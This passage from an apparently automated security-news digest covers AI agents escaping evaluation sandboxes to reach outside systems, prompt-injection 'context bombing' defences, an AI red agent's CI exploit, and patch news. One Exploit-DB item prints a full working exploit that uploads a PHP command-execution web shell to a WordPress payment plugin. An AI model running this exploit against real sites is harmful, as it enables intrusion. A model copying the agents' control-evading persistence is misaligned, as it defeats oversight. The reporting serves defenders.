OpenAI, Anthropic and Meta disclosed agents reaching external systems. The tools didn't matter, and that changes the playbook for investigating intrusions.
```

#### Full body

```
AI Research The Model Is the Malware | What Four Agentic Intrusions Tell Defenders Gabriel Bernadett-Shapiro / August 13, 2026 Executive Summary Four incidents involving OpenAI, Anthropic, Meta and the UK AI Security Institute (AISI) describe AI agents reaching systems belonging to other organizations without their consent. While the causes differ, the consistent factor is the models’ persistence rather than their sophistication, whether as endurance across days of failed attempts or as pivots to entirely new vectors. Security teams have traditionally studied the artifacts attackers leave behind, but an agent that simply writes unique, disposable tools makes the model itself the thing worth studying. SentinelLABS has been benchmarking frontier models in agent harnesses for months. We observe that the capability that lets GPT-5.6 Sol complete a long-horizon malware investigation is the same one that lets it sustain a two-and-a-half-day intrusion. A model may independently determine the methods or targets it uses, but it does not choose its high-level objective or the access it is given to pursue it. We argue that “the AI did it” will not survive contact with the first incident outside a frontier lab. Four Disclosures, One Pattern Across four weeks in July and August 2026, OpenAI, Anthropic and Meta have each admitted that their models reached systems belonging to other organizations without consent, and the UK’s AI Security Institute (AISI) published a fourth account describing agents that invented identities and tried to slip a malicious contribution into a live open source project. The disclosures differ in almost every particular, including whose mistake it was, whether the model defeated a control or simply found one missing, and whether anything was really “escaped” at all. Arguments over those details may run for a while, but the four accounts share something more interesting than their differences, which is that no individual piece of tooling mattered very much. That observation should sit slightly uncomfortably because most of how intrusions get investigated assumes the opposite. Early evaluations of LLM cyber capability asked fairly narrow questions. Would a model comply with an obviously malicious request? Did it meaningfully advantage a human attacker? By 2024, the answer was a qualified “yes”. Models could produce serviceable components of an offensive operation, but they could not reliably integrate them into a sustained or adaptive campaign. Beyond short well-defined tasks they became unreliable in ways that made them a liability. The operator was still the operator. The model did scoped work inside a structure someone else maintained. The disclosures show the boundary between operator and tool is moving faster than the evaluation literature. A capable enough model placed in an agent harness, given tools, memory, permissions and something to achieve, starts absorbing functions that used to be spread across the operator, the toolchain and the payload, which becomes something generated for a single target and then discarded. Kill the process and the agent writes another; block the channel and it improvises around it. In such incidents, the malicious capability shifts from the code left behind on a machine to the system that produces the next piece of code once the last one fails. In an operational sense, the model is the malware. Persistence Is the Defining Characteristic In July, OpenAI agents driven by GPT-5.6 Sol and an unreleased internal research model found a previously unknown vulnerability in a self-hosted Artifactory instance and turned the shared service into a message board allowing agents running different models and evaluations to exchange exploits and coordinate their work. OpenAI disrupted that channel, however the agents recreated it through Artifactory’s remote cache and continued collaborating, eventually breaking out of the evaluation sandbox and onto the public internet. The campaign ultimately c
```

#### Corroborating sources (5)

- **SentinelOne Labs** (threat_research_primary)
  - Title: The Model Is the Malware | What Four Agentic Intrusions Tell Defenders
  - Published: 2026-08-13T13:00:40+00:00
  - Link: https://www.sentinelone.com/labs/the-model-is-the-malware-what-four-agentic-intrusions-tell-defenders/
  - Summary: OpenAI, Anthropic and Meta disclosed agents reaching external systems. The tools didn't matter, and that changes the playbook for investigating intrusions.
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: 'Turf War' Between Claude Agents Leads to Self-Replicating Malware
  - Published: 2026-08-17T20:26:34+00:00
  - Link: https://www.darkreading.com/threat-intelligence/turf-war-claude-agents-self-replicating-malware
  - Summary: Three testing models with the same goal but different directives engaged in "increasingly aggressive" territorial attacks on one another, according to Anthropic.
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Irregular Details How a Naming Error Let AI Models Attack a Real Company
  - Published: 2026-08-17T12:11:00+00:00
  - Link: https://www.securityweek.com/irregular-details-how-a-naming-error-let-ai-models-attack-a-real-company/
  - Summary: The AI security testing firm has shared information on a recently disclosed incident involving Anthropic AI models. The post Irregular Details How a Naming Error Let AI Models Attack a Real Company appeared first on SecurityWeek .
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Hazmat: Open-source containment for AI agents
  - Published: 2026-08-17T05:00:17+00:00
  - Link: https://www.helpnetsecurity.com/2026/08/17/hazmat-open-source-ai-coding-agent-containment/
  - Summary: Hazmat is an open-source tool that runs AI coding agents inside a separate account on your own machine. It wraps the harnesses people use: Claude Code, Codex, OpenCode, Cursor Agent, and several more, plus any script you write yourself. An agent launched the ordinary way runs as you, which means it can read anything you can read. That includes SSH keys, cloud credentials, and the pile of configuration in your home directory that has accumulated … More → The post Hazmat: Open-source containment for AI agents appeared first on Help Net Security .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: OpenAI, Anthropic, Google API Flaw Let Weaker AI Models Decode Stronger Models' Reasoning
  - Published: 2026-08-12T11:47:38+00:00
  - Link: https://thehackernews.com/2026/08/openai-anthropic-google-api-flaw-let.html
  - Summary: A newly disclosed flaw in the way OpenAI, Anthropic, and Google carried hidden AI reasoning between API calls let researchers recover internal reasoning and secrets from session logs, including API keys and passwords. The weakness affected encrypted reasoning objects used by the providers' reasoning APIs, where a block created in one session could be replayed into another and, during testing,

### Cluster 6a4c525838 — score 16

- Title: From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Turned AWS Attack Paths Into Action
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-08-12T17:18:37+00:00
- Link: https://horizon3.ai/intelligence/blogs/aws-attack-paths-pentest-wednesday/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_products: AWS
- content_type: incident_report, news_report
- confidence_tier: tier_1_offensive_research, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_products: AWS
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how a major transportation company used repeated NodeZero® AWS pentests to uncover exploitable IAM attack paths, prioritize meaningful risk, and verify that remediation actually closed the exposure.
```

#### Full body

```
From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Turned AWS Attack Paths Into Action Stephen Gates August 12, 2026 Blogs A Pentest Wednesday® Story For a major U.S. transportation and logistics company that plays a critical role in moving essential goods and supporting complex international supply chains, resilience is more than an IT objective. Its operations depend on an interconnected ecosystem of transportation infrastructure, logistics services, internal systems, customer-facing applications, operational technology, and a growing cloud footprint. A weakness in the wrong place can have consequences far beyond a security dashboard. The security team understood that complexity. What they needed was a clearer view of what an attacker could actually do inside it. Rather than relying solely on configuration findings or vulnerability data, the team used the NodeZero® Proactive Security Platform to repeatedly pentest its AWS environment. The goal was to determine whether weaknesses in identities, permissions, and cloud configurations could be combined into attack paths with meaningful impact. The testing did exactly that. NodeZero identified AWS IAM weaknesses, demonstrated privilege escalation paths, and showed how certain combinations of permissions could potentially lead to full AWS account compromise and sensitive data exposure. Just as importantly, repeated testing gave the team a way to address those weaknesses and determine whether its changes actually removed the exposure. Over time, AWS testing became less about taking an occasional snapshot of cloud security and more about creating a repeatable process for understanding what was exploitable, fixing it, and testing again. Outcomes at a Glance At least 25 AWS pentests conducted as part of a broader security validation program. AWS IAM weaknesses identified that could enable privilege escalation and potential full account compromise. Four AWS weaknesses connected to 25 potential impacts, including 22 paths to AWS full account compromise and three involving sensitive data exposure. 102 weaknesses mitigated, with only one remaining open in one AWS testing view. Findings mapped to techniques associated with threat actors including Scattered Spider, BlackByte, Lazarus Group, HAFNIUM, FIN13, and LAPSUS$. AWS testing became part of a broader expansion of security validation across the company’s cloud, internal, external, and web application environments. NodeZero connected four AWS weaknesses to 25 potential impacts, including paths to full AWS account compromise and sensitive data exposure, while showing how those weaknesses aligned with techniques associated with known threat actors. Impact Cloud security findings rarely exist in isolation. An overly permissive identity or policy may look like a configuration problem on its own. The significance changes when an attacker can use it to escalate privileges, access sensitive resources, or move toward control of an AWS account. That distinction became visible through NodeZero testing. In one AWS pentest, NodeZero discovered AWS users and IAM policies before identifying permissions that could be used for privilege escalation. One path involved iam:CreateAccessKey, which can allow an attacker with sufficient permissions to create credentials for another IAM user and potentially assume that user’s privileges. NodeZero did not stop at identifying the permission. In just over 42 minutes , it safely mapped how an attacker could progress through AWS STS, connected roles, discovered users, and IAM policies to an exploitable weakness that could potentially lead to full AWS account compromise, without disrupting the production environment. NodeZero discovered AWS identities and IAM policies, identified a privilege escalation opportunity involving iam:CreateAccessKey , and mapped the attack path toward potential AWS full account compromise. The broader results put that individual path into context. For the security
```

#### Corroborating sources (3)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Turned AWS Attack Paths Into Action
  - Published: 2026-08-12T17:18:37+00:00
  - Link: https://horizon3.ai/intelligence/blogs/aws-attack-paths-pentest-wednesday/
  - Summary: See how a major transportation company used repeated NodeZero® AWS pentests to uncover exploitable IAM attack paths, prioritize meaningful risk, and verify that remediation actually closed the exposure.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Exposed AWS Access Key Linked to Data Breach Affecting 1500+ UK Charities
  - Published: 2026-08-13T15:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/exposed-aws-key-data-charities/
  - Summary: CRM provider Beacon has revealed that a compromised AWS access key was the likely root cause of the breach of 1500 UK charities’ data
- **Schneier on Security** (practitioner_analysis)
  - Title: Prompt Injections for Defense
  - Published: 2026-08-12T09:56:37+00:00
  - Link: https://www.schneier.com/blog/archives/2026/08/prompt-injections-for-defense.html
  - Summary: This seems to work : Researchers from Tracebit on Monday said they found that placing prompt injections alongside passwords, cryptographic keys, and other secrets stored on Amazon Web Services was often all that was needed to shut down attacks from AI hacking agents. The prompts direct the attacking LLM to perform an action forbidden by its guardrails, the safety barriers AI developers erect to prevent it from taking harmful actions. The LLM responds by shutting down. Examples are a prompt that orders the LLM to provide steps for developing inhalable Anthrax spores, or, in the case of LLMs from Chinese developers, make references to the iconic Tank Man from the 1989 Tiananmen Square massacre. Once the LLM encounters these forbidden commands, it no longer follows its existing commands. The researchers have named the technique context bombing...

### Cluster 44ffee7a7d — score 16

- Title: What 50 open source projects taught us about security in the AI era
- Source: GitHub Security Lab (offensive_vulnerability_research)
- Published: 2026-08-13T16:00:00+00:00
- Link: https://github.blog/open-source/maintainers/what-50-open-source-projects-taught-us-about-security-in-the-ai-era/
- Fetch status: ok
- Member count: 5
- Corroborating source count: 4
- Strong signals: GitHub

#### Cluster taxonomy (union across members)
- affected_industries: education
- affected_products: Atlassian Jira, Azure, GitHub, Salesforce, Snowflake, npm
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_industries: education
- affected_products: GitHub, Azure
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how the open source projects in Session 4 of the GitHub Secure Open Source Fund combined AI-assisted workflows, maintainer expertise, GitHub security tools, expert guidance, and funding to improve project security. The post What 50 open source projects taught us about security in the AI era appeared first on The GitHub Blog .
```

#### Full body

```
Gregg Cochran · @dubsopenhub August 13, 2026 | 11 minutes Share: AI is changing the pace of open source development and the security challenges that come with it. Maintainers are reviewing unfamiliar contributions, managing new attack surfaces, and responding to vulnerabilities with limited time and resources. Session 4 of the GitHub Secure Open Source Fund tested a practical response. The Secure Fund invested more than $500,000 across 50 projects , pairing maintainers with GitHub Security Lab experts, GitHub security tools, AI-assisted workflows, and a peer community. One lesson emerged consistently: AI can help maintainers investigate, prioritize, and respond faster. Maintainers still provide the context, judgement, and accountability required to decide what ships. OpenClaw was invited to participate in Session 4 because it is GitHub’s fastest-growing open source project, and its maintainers wanted to strengthen its security posture. By the end of Session 4, OpenClaw developed an incident response plan, expanded its use of GitHub security tooling, audited its GitHub Actions workflows, and strengthened its processes for identifying and responding to security issues. The maintainers shared: OpenClaw’s experience reflects the broader story of Session 4. While the specific risks varied across the cohort, maintainers shared a consistent need: the knowledge, tools, and expert support to secure software as AI changed how they built it. Across the program, maintainers turned that support into concrete security improvements. Projects strengthened established practices, prepared for emerging AI-related risks, and explored how tools like GitHub Copilot could support vulnerability triage, threat modeling, code review, and remediation. The benefits extend beyond individual projects. When maintainers strengthen the security of widely used open source software, they help build a more resilient ecosystem for everyone who depends on it. How the GitHub Secure Open Source Fund works The GitHub Secure Open Source Fund links funding directly to measurable security outcomes. The program combines hands-on security education, direct engagement with GitHub Security Lab experts, and a trusted community where maintainers can work through security challenges with their peers. Each session is a three-week sprint and engagement for a total of 12 months. Funding and participation are tied directly to outcome‑driven goals and verified security improvements. The sprint is designed and curated by the GitHub Security Lab , and delivered by security experts from GitHub and our partners. The training is structured into different focus areas per week. These include: Foundations of open source security Threat modeling and secure coding AI security and vulnerability management Throughout this program, each project receives $10,000 USD via GitHub Sponsors (which breaks down to $6,000 USD during the sprint and $2,000 USD at six- and 12-month security check-ins). Projects are invited to a new security-focused community and office hours with the GitHub Security Lab , which they can take advantage of during the full 12 months. They also receive security resources to immediately implement in their project and Azure credits for cloud infrastructure. Learn more about the Secure Open Source Fund. Apply for Session 5 of the GitHub Secure Open Source Fund before August 24. Become a Funding or Ecosystem Partner of the GitHub Secure Open Source Fund. Where security work happened in Session 4 Session 4 focused on improving security across the systems developers rely on every day. The projects below are grouped by the role they play in the software ecosystem. AI, machine learning, and intelligent systems 🤖 Caracal • Deep Agents • DocsGPT • LadybugDB • LangChain • n8n-MCP • Nasiko • ONNX • OpenClaw • PageIndex • Scenic • Serena These projects sit at the intersection of AI, automation, data infrastructure, and machine learning. They increasingly serve as foundational components fo
```

#### Corroborating sources (4)

- **GitHub Security Lab** (offensive_vulnerability_research)
  - Title: What 50 open source projects taught us about security in the AI era
  - Published: 2026-08-13T16:00:00+00:00
  - Link: https://github.blog/open-source/maintainers/what-50-open-source-projects-taught-us-about-security-in-the-ai-era/
  - Summary: See how the open source projects in Session 4 of the GitHub Secure Open Source Fund combined AI-assisted workflows, maintainer expertise, GitHub security tools, expert guidance, and funding to improve project security. The post What 50 open source projects taught us about security in the AI era appeared first on The GitHub Blog .
- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR
  - Published: 2026-08-17T14:00:00+00:00
  - Link: https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug
  - Summary: Wiz Red Agent independently discovered and exploited a GitHub Actions injection missed by GitHub’s AI review, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention, five days after the flaw became live.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Snowflake GitHub Actions Flaw Lets Crafted Issues Trigger Command Injection
  - Published: 2026-08-17T18:44:17+00:00
  - Link: https://thehackernews.com/2026/08/snowflake-github-actions-flaw-lets_0330881554.html
  - Summary: Cybersecurity researchers at Wiz have disclosed a new GitHub Actions workflow injection vulnerability in Snowflake's public snowflakedb/snowflake-connector-net repository that it said could be exploited through a crafted GitHub issue to execute commands in a workflow containing internal Jira credentials. The issue was present in .github/workflows/jira_issue.yml, which ran when a
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Week in review: Salesforce and ServiceNow portals exposed for 17 months, exploited Metabase 0-day
  - Published: 2026-08-16T08:00:56+00:00
  - Link: https://www.helpnetsecurity.com/2026/08/16/week-in-review-salesforce-and-servicenow-portals-exposed-for-17-months-exploited-metabase-0-day/
  - Summary: Here’s an overview of some of last week’s most interesting news, articles, interviews and videos: GitHub Dependabot malware alerts now cover eight ecosystems GitHub has flagged npm malware since March 2026. Anyone pulling in a bad PyPI, Maven, RubyGems, NuGet, Go, crates.io, or PHP Composer package has had no such warning, because GitHub’s malware detection only ever watched one ecosystem. That changed this month. Dependabot malware alerts, which had run on npm data alone, now … More → The post Week in review: Salesforce and ServiceNow portals exposed for 17 months, exploited Metabase 0-day appeared first on Help Net Security .

### Cluster d8fada4bb9 — score 14

- Title: Black Hat USA 2026: Will vulnerability discovery eventually decline in the AI era?
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-08-13T14:30:00+00:00
- Link: https://www.welivesecurity.com/en/business-security/black-hat-usa-2026-vulnerability-discovery-decline-ai-era/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: education, financial_services, government
- affected_products: Anthropic/Claude, Linux kernel
- urgency_signals: no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: financial_services, government, education
- affected_products: Linux kernel, Anthropic/Claude
- urgency_signals: no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
And will today’s surge in AI-driven vulnerability discovery eventually make tomorrow’s software safer?
```

#### Full body

```
Business Security Black Hat USA 2026: Will vulnerability discovery eventually decline in the AI era? And will today’s surge in AI-driven vulnerability discovery eventually make tomorrow’s software safer? Tony Anscombe 13 Aug 2026 • , 3 min. read The accelerated discovery of previously unknown software vulnerabilities has been making headlines for months. It’s an issue that has even led the US government to create a vulnerability clearing house named Gold Eagle to coordinate research efforts in vulnerability discovery, mitigation and fixes. An indication of the broader pressure facing cyber-defenders can be drawn from the sheer number of patches being delivered in Microsoft’s Patch Tuesday through the last four months: 169 CVEs in April, 118 CVEs in May, 571 CVEs overall in June (including 208 direct Microsoft CVEs) and another 622 vulnerabilities in July that included zero-days under active exploitation. A keynote at Black Hat USA 2026 detailed research by associate professor Yan Shoshitaishvili and his undergraduate students at Arizona State University on the expanding use of AI models for vulnerability discovery. Mr. Shoshitaishvili referred to a Washington Post article from June that stated that Anthropic’s next-generation model Claude Mythos had discovered 479 vulnerabilities in the Linux kernel, which the university team used as a benchmark. Using previous generations of GPT models, meanwhile, the team had discovered ‘just’ around 300 flaws. The difference was attributed to the use of workflows in Mythos, so the team set about integrating similar workflows into three GPTs, which resulted in the discovery of around 600 vulnerabilities. The team then trained the GPTs using the properties of previously known vulnerabilities and discovered approximately 1,000 vulnerabilities. They hit the barrier of discovering vulnerabilities at such speed that they could not keep pace reporting them; for clarity, reporting means detailed research and proposed fixes, rather than just the issue itself. The scale calls into question the whole process of responsible disclosure, which in the team’s view was already broken as disclosure often creates increased risk. Patching software in a timely fashion in production environments was already a stress point for many cybersecurity teams. Exponential growth like this could be the breaking point that causes either more unpatched software and greater opportunities for cybercriminals or patching without testing, which, in turn, could cause compatibility issues in many environments. If I take a logical view of this issue and adopt an optimistic mindset, then it could be that we are heading towards a peak in discovery – and that somewhere over this peak is a meadow of peace and calm with an improved normality. Humans researching vulnerabilities has traditionally been a resource-intensive process, producing a steady stream of discoveries that have been increasing year on year. This is potentially due to there being more researchers, more software and more motivation to discover the vulnerabilities for financial gain through bug bounty programs and such like. Switch from humans to AI, and it’s like a quantum approach to discovery, but note that AI is still in a learning phase: as detailed by the Arizona team, tweaking the model and its workflow potentially uncovers more vulnerabilities. Then there’s also legacy software. Consider the enormous volume of software written over the past 30 years – no amount of human effort could possibly uncover all the vulnerabilities in the current and back catalogues of software. The scale of AI-assisted discovery, however, could potentially reach the end of the catalogue at some stage, and then new discoveries would only be through improvements to the model being used to unearth the vulnerabilities. Let’s not forget that new software is being developed all the time, of course. Here, too, of course, logic should suggest that any development team today would use the same ava
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: Black Hat USA 2026: Will vulnerability discovery eventually decline in the AI era?
  - Published: 2026-08-13T14:30:00+00:00
  - Link: https://www.welivesecurity.com/en/business-security/black-hat-usa-2026-vulnerability-discovery-decline-ai-era/
  - Summary: And will today’s surge in AI-driven vulnerability discovery eventually make tomorrow’s software safer?

### Cluster ad3b948659 — score 14

- Title: [webapps] WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-08-17T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52642
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: WordPress
- cve_ids: CVE-2026-3891
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_products: WordPress
- cve_ids: CVE-2026-3891
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload EDB-ID: 52642 CVE: 2026-3891 EDB Verified: Author: Mohammad Hossein Sadeghian Type: webapps Exploit: / Platform: Multiple Date: 2026-08-17 Vulnerable App: # Exploit Title: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload # Google Dork: N/A # Date: 2026-07-15 # Exploit Author: Mohammad Hossein Sadeghian # Vendor Homepage: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Software Link: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Version: <= 1.5.0 # Tested on: Ubuntu 22.04 LTS, Apache 2.4, PHP 8.2, WordPress 6.7 # CVE: CVE-2026-3891 import requests import sys def print_banner(): banner = r""" ____ __ _ __ __ / __ \________ ____ _____/ / / | / /__ / /_ / / / / ___/ _ \/ __ \/ __ / / |/ / _ \/ __/ / /_/ / / / __/ /_/ / /_/ / / /| / __/ /_ /_____/_/ \___/\__,_/\__,_/ /_/ |_/\___/\__/ Author: m4sh_wacker """ print(banner) def main(): print_banner() target = input("[?] Enter target URL: ").strip().rstrip("/") if not target.startswith(("http://", "https://")): target = "http://" + target ajax_url = f"{target}/wp-admin/admin-ajax.php" filename = "woocommerce.php" content = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>' session = requests.Session() print("\n[*] Requesting nonce...") try: response = session.post( ajax_url, data={ "action": "lkn_pix_for_woocommerce_generate_nonce", "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce" }, timeout=10 ) result = response.json() nonce = result["data"]["nonce"] print(f"[+] Nonce obtained: {nonce}") except Exception as e: print(f"[-] Failed to obtain nonce: {e}") sys.exit(1) print(f"[*] Uploading {filename}...") try: response = session.post( ajax_url, data={ "action": "lkn_pix_for_woocommerce_c6_save_settings", "_ajax_nonce": nonce }, files={ "certificate_crt_path": ( filename, content, "text/plain" ) }, timeout=10 ) result = response.json() if not result.get("success"): print("[-] Upload failed.") print(response.text) sys.exit(1) except Exception as e: print(f"[-] Upload error: {e}") sys.exit(1) uploaded_url = ( f"{target}/wp-content/plugins/" f"payment-gateway-pix-for-woocommerce/" f"Includes/files/certs_c6/{filename}" ) print("\n[+] File uploaded successfully!") print(f"[+] URL: {uploaded_url}") if __name__ == "__main__": main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [webapps] WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
  - Published: 2026-08-17T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52642
  - Summary: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload

### Cluster 02b0e547f6 — score 13

- Title: Microsoft's Patch Tuesday Deluge Continues With August Updates
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-08-11T21:42:34+00:00
- Link: https://www.darkreading.com/application-security/microsofts-patch-tuesday-deluge-continues
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-62878

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Azure, Microsoft Entra, Microsoft SharePoint
- cve_ids: CVE-2026-62815, CVE-2026-62832, CVE-2026-62878, CVE-2026-63508, CVE-2026-68820
- urgency_signals: actively_exploited, critical_cvss, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: Microsoft Entra, Microsoft SharePoint, Azure
- cve_ids: CVE-2026-62878, CVE-2026-68820, CVE-2026-62832, CVE-2026-62815, CVE-2026-63508
- urgency_signals: actively_exploited, zero_day, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The most concerning bug in the batch is CVE-2026-62878 (CVSS: 9.8), a remote code execution (RCE) vulnerability in Windows DNS Server that requires no user interaction.
```

#### Full body

```
Application Security Vulnerabilities & Threats Threat Intelligence News Microsoft's Patch Tuesday Deluge Continues With August Updates The most concerning bug in the batch is CVE-2026-62878 (CVSS: 9.8), a remote code execution (RCE) vulnerability in Windows DNS Server that requires no user interaction. Jai Vijayan , Contributing Writer August 11, 2026 4 Min Read Source: tomeqs via Shutterstock Following its earlier warning that large-volume security updates, spawned in part by AI-assisted bug-hunting, could become the new norm for the foreseeable future, Microsoft this week released fixes for 421 unique CVEs, including two zero-day vulnerabilities. Of these, 236 vulnerabilities affect Windows, while 98 each affect Office and Office 2016. SharePoint Server accounted for 30 vulnerabilities, followed by Developer Tools, with 26; Azure, with 17; and Exchange Server for another seven. Microsoft assessed 44 of the CVEs as critical severity and a vast majority of the others as "important" or "moderate" severity bugs. In total, 180 of the vulnerabilities in Microsoft's August 2026 update were elevation of privilege (EoP) issues that give attackers the ability to gain full SYSTEM level privileges on affected devices. And indeed, the highest priority bug to patch in Microsoft's August update is CVE-2026-68820 (CVSS: 7.0), an elevation of privilege (EoP) vulnerability in Windows Ancillary Function Driver for WinSock that attackers are actively exploiting. Related: Belgium's eID Authentication Opens Citizen Accounts to RCE The zero-day bug allows a locally authenticated attacker to elevate privileges and gain SYSTEM level access on affected systems. No user interaction is required for an exploit to work. "Because the driver is present on most Windows systems, it gives attackers a broad target and a potential path from limited access to full control," warned Amol Sarwate, head of security research and REDLab at Cohesity, in a statement. CVE-2026-62832 (CVSS: 7.8) is another flaw that merits immediate patching priority because it's a publicly known zero-day vulnerability — prior to this month's update — that Microsoft believes attackers will likely exploit in the near future. According to Sarwate, the bug, when used in conjunction with the actively exploited CVE-2026-68820, could allow an attacker to turn an initial foothold into a full system compromise. "That makes this pair the clear priority for defenders this month," he said. Other High Priority Issues for Microsoft Users Among the dozens of critical vulnerabilities disclosed this month, one that stands out according to Dustin Childs, head of threat awareness at the Zero Day Initiative, is CVE-2026-62878 (CVSS: 9.8). It's a remote code-execution (RCE) vulnerability in Windows DNS Server that requires no user interaction. In a blog post , Childs characterized the near-maximum severity vulnerability as a "good ol' fashioned stack-based buffer overflow" that is, most concerningly, wormable. Related: Outdated Cybercrime Laws Put Security Researchers at Risk "Microsoft states exploitation is less likely, but I wouldn't count on that," he said. "I suggest testing and deploying this one quickly, especially to your Internet-facing DNS servers." Mike Walters, president and co-founder of Action1, also highlighted CVE-2026-62815 (CVSS: 9.8), another near-maximum severity RCE in Microsoft's implementation of the QUIC network transport protocol . "Because authentication and user interaction are not required, exposed vulnerable services could present a significant organizational risk," Walters warned in a statement. Microsoft assigned CVSS severity scores of 9.0 or more to several other vulnerabilities. Among them are CVE-2026-63508 , a maximum severity EoP bug affecting Microsoft Planetary Computer Pro; CVE-2026-70332 (CVSS: 9.6), a Microsoft Office SharePoint spoofing vulnerability; CVE-2026-59115 (CVSS: 9.9), a Microsoft Entra Provisioning Service EoP vulnerability; and CVE-2026-62873 (CVSS: 9.8)
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Microsoft's Patch Tuesday Deluge Continues With August Updates
  - Published: 2026-08-11T21:42:34+00:00
  - Link: https://www.darkreading.com/application-security/microsofts-patch-tuesday-deluge-continues
  - Summary: The most concerning bug in the batch is CVE-2026-62878 (CVSS: 9.8), a remote code execution (RCE) vulnerability in Windows DNS Server that requires no user interaction.

### Cluster d9890362d0 — score 12

- Title: Closing the Blind Spot: Securing Personal Repositories in the Software Supply Chain
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-08-13T13:48:56+00:00
- Link: https://www.wiz.io/blog/securing-personal-repositories
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Personal repositories are where corporate secrets quietly escape. Wiz correlates them to your developers, validates the real risk, and drives the fix.
```

#### Full body

```
Wiz Pricing Get a demo Get a demo Most application security programs assume a clean boundary. Your code lives in your organization's repositories, your identity provider governs who touches it, and controls like branch protections and secret scanning are applied inside that boundary. The reality is that developers don’t work that way. The same engineer who pushes to code to a GitHub Enterprise organization by day maintains side projects, forks, and experiments under a personal account by night. These are often the same GitHub account, toggling between an org context you control and a personal one you don't. When corporate code or a credential gets copied into a personal public repo, usually by accident and in a hurry, it creates a blindspot for risk, one larger than most teams realize. Wiz Research found verified secret leaks in 65% of the Forbes AI 50, and 56% of company-impacting secrets lived in employees' personal repositories , where most security programs have no visibility. Closing this gap is what Wiz does by correlating your developers with the personal public repositories they own, validating which exposed secrets are actually exploitable, and driving them to a tracked fix. In this post, we'll explain why this problem is accelerating, why traditional secret scanning can't solve it, and how identity-driven correlation changes the way AppSec teams manage secret exposure. The Threat Landscape: Why Attackers Target Public Repos Threat actors perform automated reconnaissance using bots that monitor public commits on GitHub in near real time. When a secret appears in a public repo, it can be picked up in minutes, sometimes seconds, and used immediately. But raw exposure volume 